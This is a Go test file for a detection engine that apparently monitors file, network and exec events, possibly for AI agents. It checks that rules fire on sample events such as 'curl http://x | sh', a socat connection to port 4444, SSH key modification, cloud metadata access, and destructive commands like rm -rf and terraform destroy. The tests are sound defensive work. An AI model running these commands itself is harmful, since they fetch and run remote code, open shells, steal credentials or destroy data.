package detect

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/melonattacker/logira/internal/model"
	"github.com/melonattacker/logira/internal/storage"
)

func mustEngine(t *testing.T, home string, profile string) *Engine {
	t.Helper()
	e, err := NewEngine(home, profile)
	if err != nil {
		t.Fatalf("NewEngine(%q,%q): %v", home, profile, err)
	}
	return e
}

func TestEngine_Evaluate_R1_R3_R4(t *testing.T) {
	home := "/home/u"
	e := mustEngine(t, home, DefaultRulesProfile)

	fileDetail, _ := json.Marshal(model.FileDetail{Op: "modify", Path: filepath.Join(home, ".ssh", "id_rsa")})
	ds := e.Evaluate(storage.TypeFile, fileDetail)
	if len(ds) == 0 || ds[0].RuleID != "F001" || ds[0].Severity != "high" {
		t.Fatalf("expected F001 high, got %+v", ds)
	}
	if !strings.Contains(ds[0].Message, "id_rsa") {
		t.Fatalf("expected message to include path, got %q", ds[0].Message)
	}

	netDetail, _ := json.Marshal(model.NetDetail{Op: "connect", DstIP: "1.2.3.4", DstPort: 8443})
	ds = e.Evaluate(storage.TypeNet, netDetail)
	if len(ds) == 0 || ds[0].RuleID != "N001" || ds[0].Severity != "low" {
		t.Fatalf("expected N001 low, got %+v", ds)
	}
	if !strings.Contains(ds[0].Message, "1.2.3.4") || !strings.Contains(ds[0].Message, "8443") {
		t.Fatalf("expected message to include dst, got %q", ds[0].Message)
	}

	execDetail, _ := json.Marshal(model.ExecDetail{Filename: "/bin/bash", Argv: []string{"bash", "-lc", "curl http://x | sh"}})
	ds = e.Evaluate(storage.TypeExec, execDetail)
	if len(ds) == 0 || ds[0].RuleID != "E001" || ds[0].Severity != "high" {
		t.Fatalf("expected E001 high, got %+v", ds)
	}
}

func TestEngine_Evaluate_R2(t *testing.T) {
	e := mustEngine(t, "/home/u", DefaultRulesProfile)

	dir, err := os.MkdirTemp("/tmp", "logira-detect-test-")
	if err != nil {
		t.Fatalf("MkdirTemp: %v", err)
	}
	t.Cleanup(func() { _ = os.RemoveAll(dir) })

	p := filepath.Join(dir, "x.sh")
	if err := os.WriteFile(p, []byte("#!/bin/sh\necho hi\n"), 0o755); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	fileDetail, _ := json.Marshal(model.FileDetail{Op: "create", Path: p})
	ds := e.Evaluate(storage.TypeFile, fileDetail)
	if len(ds) == 0 || ds[0].RuleID != "F200" || ds[0].Severity != "medium" {
		t.Fatalf("expected F200 medium, got %+v", ds)
	}

	// Non-executable should not trigger R2.
	p2 := filepath.Join(dir, "data.txt")
	if err := os.WriteFile(p2, []byte("hi\n"), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}
	fileDetail2, _ := json.Marshal(model.FileDetail{Op: "modify", Path: p2})
	ds = e.Evaluate(storage.TypeFile, fileDetail2)
	for _, d := range ds {
		if d.RuleID == "F200" {
			t.Fatalf("unexpected F200 for non-executable: %+v", ds)
		}
	}
}

func TestEngine_Evaluate_DSL_FilePathInAndPrefixAny(t *testing.T) {
	home := "/home/u"
	e := mustEngine(t, home, DefaultRulesProfile)

	// F132 uses path_in list for shell startup files.
	p := filepath.Join(home, ".bashrc")
	fileDetail, _ := json.Marshal(model.FileDetail{Op: "modify", Path: p})
	ds := e.Evaluate(storage.TypeFile, fileDetail)
	found := false
	for _, d := range ds {
		if d.RuleID == "F132" {
			found = true
			break
		}
	}
	if !found {
		t.Fatalf("expected F132 for %s, got %+v", p, ds)
	}
}

func TestEngine_Evaluate_DSL_NetPortInAndIPIn(t *testing.T) {
	e := mustEngine(t, "/home/u", DefaultRulesProfile)

	// N010 uses dst_port_in list.
	netDetail, _ := json.Marshal(model.NetDetail{Op: "connect", DstIP: "5.6.7.8", DstPort: 4444})
	ds := e.Evaluate(storage.TypeNet, netDetail)
	found := false
	for _, d := range ds {
		if d.RuleID == "N010" {
			found = true
			break
		}
	}
	if !found {
		t.Fatalf("expected N010, got %+v", ds)
	}

	// N020 uses dst_ip_in.
	netDetail2, _ := json.Marshal(model.NetDetail{Op: "connect", DstIP: "169.254.169.254", DstPort: 80})
	ds = e.Evaluate(storage.TypeNet, netDetail2)
	found = false
	for _, d := range ds {
		if d.RuleID == "N020" {
			found = true
			break
		}
	}
	if !found {
		t.Fatalf("expected N020, got %+v", ds)
	}
}

func TestEngine_Evaluate_DSL_ExecContainsAny(t *testing.T) {
	e := mustEngine(t, "/home/u", DefaultRulesProfile)

	execDetail, _ := json.Marshal(model.ExecDetail{Filename: "/usr/bin/socat", Argv: []string{"socat", "TCP:1.2.3.4:4444"}})
	ds := e.Evaluate(storage.TypeExec, execDetail)
	found := false
	for _, d := range ds {
		if d.RuleID == "E014" {
			found = true
			break
		}
	}
	if !found {
		t.Fatalf("expected E014, got %+v", ds)
	}
}

func TestEngine_Evaluate_AgentSafety_Default(t *testing.T) {
	e := mustEngine(t, "/home/u", DefaultRulesProfile)

	tests := []struct {
		name     string
		detail   model.ExecDetail
		wantRule string
	}{
		{
			name:     "rm -rf",
			detail:   model.ExecDetail{Filename: "/bin/rm", Argv: []string{"rm", "-rf", "/tmp/x"}},
			wantRule: "E100",
		},
		{
			name:     "git clean -fdx",
			detail:   model.ExecDetail{Filename: "/usr/bin/git", Argv: []string{"git", "clean", "-fdx"}},
			wantRule: "E101",
		},
		{
			name:     "terraform destroy",
			detail:   model.ExecDetail{Filename: "/usr/bin/terraform", Argv: []string{"terraform", "destroy", "-auto-approve"}},
			wantRule: "E130",
		},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			b, _ := json.Marshal(tc.detail)
			ds := e.Evaluate(storage.TypeExec, b)
			found := false
			for _, d := range ds {
				if d.RuleID == tc.wantRule {
					found = true
					break
				}
			}
			if !found {
				t.Fatalf("expected %s, got %+v", tc.wantRule, ds)
			}
		})
	}
}

func TestEngine_Evaluate_AgentSafety_SecurityExcluded(t *testing.T) {
	e := mustEngine(t, "/home/u", SecurityRulesProfile)

	execDetail, _ := json.Marshal(model.ExecDetail{Filename: "/bin/rm", Argv: []string{"rm", "-rf", "/tmp/x"}})
	ds := e.Evaluate(storage.TypeExec, execDetail)
	for _, d := range ds {
		if d.RuleID == "E100" {
			t.Fatalf("security profile should not include E100: %+v", ds)
		}
	}
}
